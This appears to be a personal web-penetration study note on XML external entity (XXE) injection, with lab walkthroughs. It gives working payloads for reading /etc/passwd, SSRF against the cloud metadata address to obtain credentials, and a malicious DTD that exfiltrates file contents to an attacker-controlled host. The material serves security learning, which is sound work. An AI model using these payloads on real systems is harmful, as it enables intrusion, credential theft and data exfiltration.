# XML external entity injection (XXE)

`XXE` is a web security vulnerability enabling attackers to manipulate `XML` data processing. It grants unauthorized access to application server files and potential interaction with backend and external systems accessible to the application. In certain cases, `XXE` attacks can be escalated to compromise the underlying server or back-end infrastructure through `SSRF` attacks.

### How do XXE vulnerabilities arise

Applications often utilize `XML` format for data transmission between the browser and server. The server-side `XML` data processing is typically handled by standard libraries or platform `APIs`. `XXE` vulnerabilities occur due to potentially harmful features within the `XML` specification, which are still supported by standard parsers even if unused by the application. `XML` external entities (custom XML entities) are of particular concern as they can retrieve values from external sources outside the declared `DTD`. This poses a security risk, as entities can be defined based on file paths or URLs.

### What are the types of XXE attacks

There are various types of XXE attacks:

- **Exploiting XXE to retrieve files**, where an external entity is defined containing the contents of a file, and returned in the application's response.

- **Exploiting XXE to perform SSRF attacks**, where an external entity is defined based on a URL to a back-end system.

- **Exploiting blind XXE exfiltrate data out-of-band**, where sensitive data is transmitted from the application server to a system that the attacker controls.

- **Exploiting blind XXE to retrieve data via error messages**, where the attacker can trigger a parsing error message containing sensitive data.

### Exploiting XXE to retrieve files

To perform an XXE injection attack that retrieves an arbitrary file from the server's filesystem, you need to modify the submitted XML in two ways: 

- Introduce (or edit) a `DOCTYPE` element that defines an external entity containing the path to the file.

- Edit a data value in the `XML` that is returned in the application's response, to make use of the defined external entity.
  
  For example, suppose a shopping application checks for the stock level of a product by submitting the following XML to the server: 

```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>381</productId></stockCheck>
```

The application performs no particular defenses against XXE attacks, so you can exploit the XXE vulnerability to retrieve the /etc/passwd file by submitting the following XXE payload: 

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

This XXE payload defines an external entity &xxe; whose value is the contents of the /etc/passwd file and uses the entity within the productId value. This causes the application's response to include the contents of the file: 

```log
Invalid product ID: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```

> **NOTE**
> 
> With real-world XXE vulnerabilities, there will often be a large number of data values within the submitted XML, any one of which might be used within the application's response. To test systematically for XXE vulnerabilities, you will generally need to test each data node in the XML individually, by making use of your defined entity and seeing whether it appears within the response. 

#### EX: Exploiting XXE using external entities to retrieve files

![Screenshot from 2023-08-11 12-25-13](https://github.com/MohammedHawary/Web-Penetration/assets/94152045/acfc3651-004e-4f37-a7db-86a498652aa3)

After press `check stock` and capture this request i saw the xml data lets try `XXE`

![Screenshot from 2023-08-11 12-22-30](https://github.com/MohammedHawary/Web-Penetration/assets/94152045/bdf9a7f6-af47-4f68-9b14-fffb0cdfe416)
let's add this payload: 

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]
```

and add `&xxe;` in any tages

![Screenshot from 2023-08-11 12-24-10](https://github.com/MohammedHawary/Web-Penetration/assets/94152045/761cf807-0ba7-445f-b96c-67fd1ffe8cf8)
we can get the file `/etc/passwd`

![Screenshot from 2023-08-11 12-24-18](https://github.com/MohammedHawary/Web-Penetration/assets/94152045/70496007-8c6a-4aa0-8f74-12a1e4f6ae6f)

### Exploiting XXE to perform SSRF attacks

XXE attacks have two main impacts: retrieval of sensitive data and `SSRF`. `SSRF` is a severe vulnerability where the server-side application can be manipulated to make HTTP requests to any accessible URL.

To exploit an `XXE` vulnerability for an `SSRF` attack, you define an external `XML` entity using the target URL and incorporate it within a data value. If the defined entity appears in the application's response, you can view the URL's response within the application and interact with the backend system. If not, `blind SSRF` attacks are still possible, which can have significant consequences.

 In the following `XXE` example, the external entity will cause the server to make a back-end HTTP request to an internal system within the organization's infrastructure: 

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
```

#### EX: Exploiting XXE to perform SSRF attacks

![Screenshot from 2023-08-11 13-27-47](https://github.com/MohammedHawary/Web-Penetration/assets/94152045/b24bcd49-d2ee-4ed2-bedd-0fe393c34d9d)

After press `check stock` and capture this request i saw the xml data let's try `XXE`

![Screenshot from 2023-08-11 13-37-23](https://github.com/MohammedHawary/CTF-Challenges-Writeups/assets/94152045/1373a20f-df7c-4fed-9512-26dc4081c738)

 let's add this payload:

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>
```

and add `&xxe;` in any tages![Screenshot from 2023-08-11 13-26-39](https://github.com/MohammedHawary/Web-Penetration/assets/94152045/752343e9-dd5f-4e2b-a726-8103f4c9a5c4)

I saw the `latest` directory let's add it in our path and send it again![Screenshot from 2023-08-11 13-26-56](https://github.com/MohammedHawary/Web-Penetration/assets/94152045/fbb8e1a8-e6b7-4b0e-a4f9-25c975725241)

I saw the `meta-data` directory after adding all directory finely I get admin credential![Screenshot from 2023-08-11 13-26-22](https://github.com/MohammedHawary/Web-Penetration/assets/94152045/8b9db249-02ef-4920-a4d2-0dba43c7c4cb)![Screenshot from 2023-08-11 13-27-39](https://github.com/MohammedHawary/Web-Penetration/assets/94152045/f66c9870-9c45-42ce-b1ea-6371ddca9dbb)

### Blind XXE vulnerabilities

**Blind XXE vulnerabilities** occur when an application doesn't reveal external entity values in its responses, making it impossible to directly access server-side files. Despite this limitation, these vulnerabilities can still be discovered and exploited using advanced techniques. Out-of-band methods can be employed to identify vulnerabilities and exfiltrate data, while triggering `XML` parsing errors may expose sensitive information through error messages.

 There are two broad ways in which you can find and exploit blind XXE vulnerabilities:

- You can trigger **out-of-band network interactions**, sometimes exfiltrating sensitive data within the interaction data.

- You can trigger **XML parsing errors** in such a way that the error messages contain sensitive data.

### Detecting blind XXE using out-of-band (OAST) techniques

You can often detect blind XXE using the same technique as for XXE SSRF attacks but triggering the out-of-band network interaction to a system that you control.

For example, you would define an external entity as follows:

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]>
```

You would then make use of the defined entity in a data value within the XML.

This XXE attack causes the server to make a back-end HTTP request to the specified URL. The attacker can monitor for the resulting DNS lookup and HTTP request, and thereby detect that the XXE attack was successful. 

#### EX1: Blind XXE with out-of-band interaction

![Screenshot from 2023-08-11 14-05-11](https://github.com/MohammedHawary/CTF-Challenges-Writeups/assets/94152045/bf50c18d-4934-436e-bf3c-6405f838f2a9)
After press `check stock` and capture this request i saw the xml data let's try `XXE`

![Screenshot from 2023-08-11 14-05-28](https://github.com/MohammedHawary/CTF-Challenges-Writeups/assets/94152045/a97a8ead-66e2-4776-b1df-50b2a4ac7115)
 let's use burp colaborator and  add this payload:

```xml
 <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://413sptw6nb67mnwb5rytse12nttjh8.oastify.com"> ]>
```

and add `&xxe;` in any tages

![Screenshot from 2023-08-11 14-06-19](https://github.com/MohammedHawary/CTF-Challenges-Writeups/assets/94152045/87e69785-c106-4f78-abc5-f6f2147d7d7d)

#### EX2: Blind XXE with out-of-band interaction via XML parameter entities

In certain cases, regular entity-based XXE attacks may be blocked by input validation or XML parser hardening implemented by the application. In such scenarios, XML parameter entities can be utilized as an alternative. These entities are restricted to being referenced within the DTD. Two key points to remember are: XML parameter entities are declared with a percent character preceding the entity name, and they serve the purpose at hand.

For example:

```xml
<!ENTITY % myparameterentity "my parameter entity value" >
```

 And second, parameter entities are referenced using the percent character instead of the usual ampersand: 

```xml
%myparameterentity;
```

This means that you can test for blind XXE using out-of-band detection via XML parameter entities as follows:

```xml
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>
```

This XXE payload declares an XML parameter entity called xxe and then uses the entity within the DTD. This will cause a DNS lookup and HTTP request to the attacker's domain, verifying that the attack was successful.

##### Lab

![Screenshot from 2023-08-11 18-38-05](https://github.com/MohammedHawary/Web-Penetration/assets/94152045/1516a411-0965-44d3-91e5-ed6e5e67a9c4)
After press `check stock` and capture this request i saw the xml data let's try `XXE`![Screenshot from 2023-08-11 18-52-09](https://github.com/MohammedHawary/Web-Penetration/assets/94152045/5e306ec5-b69a-44e5-b0be-59503c7e7b34)
 let's use burp colaborator and add this payload:

```xml
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://413sptw6nb67mnwb5rytse12nttjh8.oastify.com"> %xxe; ]>
```

![Screenshot from 2023-08-11 18-52-59](https://github.com/MohammedHawary/Web-Penetration/assets/94152045/e5c395e9-b969-4f6f-83b0-3813522a779a)

![Screenshot from 2023-08-11 18-50-40](https://github.com/MohammedHawary/Web-Penetration/assets/94152045/9b79b005-733e-4647-a28a-a9660920174d)

### Exploiting blind XXE to exfiltrate data out-of-band

Detecting a `blind XXE` vulnerability using out-of-band techniques is useful, but it doesn't show how the vulnerability can be exploited. The ultimate goal for an attacker is to extract sensitive data, which can be accomplished through a `blind XXE` vulnerability. This requires the attacker to host a malicious `DTD` on a system they control and invoke the external `DTD` using an `in-band XXE` payload.

An example of a malicious **DTD to exfiltrate** the contents of the `/etc/passwd` file is as follows: 

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```

This DTD carries out the following steps:

- Defines an XML parameter entity called `file`, containing the contents of the `/etc/passwd` file.

- Defines an XML parameter entity called `eval`, containing a dynamic declaration of another XML parameter entity called `exfiltrate`. The `exfiltrate` entity will be evaluated by making an HTTP request to the attacker's web server containing the value of the `file` entity within the URL query string.

- Uses the `eval` entity, which causes the dynamic declaration of the `exfiltrate` entity to be performed.

- Uses the `exfiltrate` entity, so that its value is evaluated by requesting the specified URL.

The attacker must then host the malicious DTD on a system that they control, normally by loading it onto their own webserver. For example, the attacker might serve the malicious DTD at the following URL: 

    http://web-attacker.com/malicious.dtd

Finally, the attacker must submit the following XXE payload to the vulnerable application: 

```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM
"http://web-attacker.com/malicious.dtd"> %xxe;]>
```

This XXE payload declares an XML parameter entity called xxe and then uses the entity within the DTD. This will cause the XML parser to fetch the external DTD from the attacker's server and interpret it inline. The steps defined within the malicious DTD are then executed, and the /etc/passwd file is transmitted to the attacker's server. 

> **Note**
> 
> This technique might not work with some file contents, including the newline characters contained in the `/etc/passwd` file. This is because some `XML` parsers fetch the URL in the external entity definition using an `API` that validates the characters that are **allowed** to appear within the URL. In this situation, it might be possible to use the `FTP` protocol instead of `HTTP`. Sometimes, it will not be possible to exfiltrate data containing newline characters, and so a file such as `/etc/hostname` can be targeted instead. 

# TO BE CONTINUE
